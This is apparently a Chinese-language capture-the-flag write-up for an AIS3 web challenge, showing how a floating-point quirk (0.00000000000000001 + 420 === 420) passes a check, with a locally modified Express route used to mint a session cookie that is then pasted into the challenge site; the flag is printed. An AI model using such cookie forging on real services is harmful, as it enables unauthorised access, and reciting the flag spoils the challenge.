先直接把他架起來看看

被嘲諷了QAQ
![](https://i.imgur.com/SDvhWqm.png)

看起來最好玩的部分是
`if (n && (n + 420) === 420)`

只要手動指定req.session.magic後，Cookie裡面就會存這個值ㄌ。

當時我的想法是用`Object(0)`
![](https://i.imgur.com/7E6FLjW.png)
但是用這種cookie存的變數，只能是數字，不能是物件QQ

後來聽了大神的解法，發現可以用`n = 0.00000000000000001`
![](https://i.imgur.com/Milxmn9.png)

先手動把程式這樣寫
```javascript=
app.get('/flag.txt', (req, res) => {
  res.setHeader('Content-Type', 'text/plain');

  req.session.magic = 0.00000000000000001;
  let n = req.session.magic;

  if (n && (n + 420) === 420)
    res.sendFile('/flag');
  else
    res.send('you are a sad person too');
});
```

接下來把餅乾複製到題目的網站
![](https://i.imgur.com/iLcZZs5.png)


![](https://i.imgur.com/w1QSvhy.png)

Flag:`AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}`